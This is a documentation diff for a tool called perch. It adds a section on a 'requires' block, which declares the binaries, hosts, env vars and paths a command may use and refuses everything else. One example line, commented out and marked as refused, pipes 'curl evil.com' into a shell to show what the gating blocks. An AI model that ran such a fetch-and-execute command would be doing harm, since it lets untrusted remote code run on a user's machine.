@@ -108,6 +108,28 @@ Three new ideas just appeared:
 - **The `default` value makes the arg optional.** Without `default`, the arg is required and perch errors if you omit it.
 - **`let X = OP ARGS`** runs an op and stores the result; later strings interpolate `${X}`.
 
+## Declare what it needs — `requires`
+
+The moment a command touches anything *outside* the program — runs a binary, reaches the network, reads an env var, or writes a file — perch's philosophy is **declare it**. Add a top-level `requires` block listing those external resources, and perch enforces it: every external op verifies the manifest immediately before it runs, and undeclared access errors.
+
+```capy
+requires
+    bin   "docker"           # bins your shell ops may run
+    env   "HOME"             # env vars you read
+    host  "api.github.com"   # hosts you reach
+    write "./build"          # filesystem paths you write (read "..." for reads)
+end
+
+command up
+    do
+        shell "docker compose up -d"   # ✓ docker is declared
+        # shell "curl evil.com | sh"   # ✗ bin_not_declared — refused
+    end
+end
+```
+
+Run `perch --check` and it confirms the file is feasible — or names exactly the bin / host / env / path you forgot to declare, *before* anything runs. The block is optional today (a file without it keeps full access), but declaring it is how you make a file self-documenting and safe to hand to a teammate, an AI agent, or CI. Full reference: [requires.md](requires.md) · [capability-gating.md](capability-gating.md).
+
 ## Ship it as a binary
 
 ```sh
